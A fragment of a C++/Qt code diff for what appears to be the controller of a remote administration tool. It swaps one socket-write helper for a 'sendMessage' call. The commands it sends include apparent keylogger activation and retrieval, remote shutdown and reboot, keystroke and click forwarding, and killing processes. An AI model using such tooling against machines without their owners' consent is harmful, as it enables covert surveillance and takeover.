     this->ponerMensajeChat(ui->entradaChatTexto->text(),ui->textoNickCliente->text());
-    util.escribirSocket ( "chat|@|" + ui->entradaChatTexto->text() + "|@|" + ui->textoNickCliente->text() + "|@|" + ui->textoNickServidor->text() ,socket[activo] );
+   cliente.sendMessage(servidor, "chat|@|" + ui->entradaChatTexto->text() + "|@|" + ui->textoNickCliente->text() + "|@|" + ui->textoNickServidor->text()  );
     ui->entradaChatTexto->clear();
 }
 void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
@@ -833,33 +823,25 @@ void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
     ui->salidaChatTexto->document()->setHtml(ui->salidaChatTexto->document()->toHtml() + "<br>" + quien + " dice: " + mensajeChat);
 }
 
-void MainWindow::ponerPuertos()
-{
-    port = opcionesPuertos.puertoPrincipal()->text().toInt();
-    portArchivos = opcionesPuertos.puertoArchivos()->text().toInt();
-    portEscritorio = opcionesPuertos.puertoEscritorio()->text().toInt();
-    portWebcam = opcionesPuertos.puertoWebcam()->text().toInt();
-}
-
 void MainWindow::activarKey()
 {
-    util.escribirSocket("activark|@|",socket[activo]);
+    cliente.sendMessage(servidor,"activark|@|");
 }
 void MainWindow::desactivarKey()
 {
-    util.escribirSocket("desactivark|@|",socket[activo]);
+    cliente.sendMessage(servidor,"desactivark|@|");
 }
 void MainWindow::recibirKey()
 {
-    util.escribirSocket("recibirk|@|",socket[activo]);
+    cliente.sendMessage(servidor,"recibirk|@|");
 }
 void MainWindow::limpiarKey()
 {
-    util.escribirSocket("limpiark|@|",socket[activo]);
+    cliente.sendMessage(servidor,"limpiark|@|");
 }
 void MainWindow::pedirInformacion()
 {
-    util.escribirSocket("informacion|@|",socket[activo]);
+    cliente.sendMessage(servidor,"informacion|@|");
 }
 void MainWindow::traducir(QAction *idioma)
 {
@@ -881,29 +863,29 @@ void MainWindow::traducir(QAction *idioma)
 }
 void MainWindow::apagarEquipo()
 {
-    util.escribirSocket("apagarequipo|@|",socket[activo]);
+    cliente.sendMessage(servidor,"apagarequipo|@|");
 }
 void MainWindow::reiniciarEquipo()
 {
-    util.escribirSocket("reiniciarequipo|@|",socket[activo]);
+    cliente.sendMessage(servidor,"reiniciarequipo|@|");
 }
 void MainWindow::clicado(QString cadena)
 {
-    util.escribirSocket(cadena,socket[activo]);
+    cliente.sendMessage(servidor,cadena);
 }
 void MainWindow::enviarTecla(QString cadena)
 {
-    util.escribirSocket(cadena,socket[activo]);
+    cliente.sendMessage(servidor,cadena);
 }
 void MainWindow::actualizarProcesos()
 {
     ui->listProcesos->clear();
-    util.escribirSocket("procesos|@|",socket[activo]);
+    cliente.sendMessage(servidor,"procesos|@|");
 }
 void MainWindow::matarProceso()
 {
     if(ui->listProcesos->currentRow() >= 0)
     {
-        util.escribirSocket("matar|@|" + ui->listProcesos->currentItem()->text(),socket[activo]);
+        cliente.sendMessage(servidor,"matar|@|" + ui->listProcesos->currentItem()->text());
     }
 }
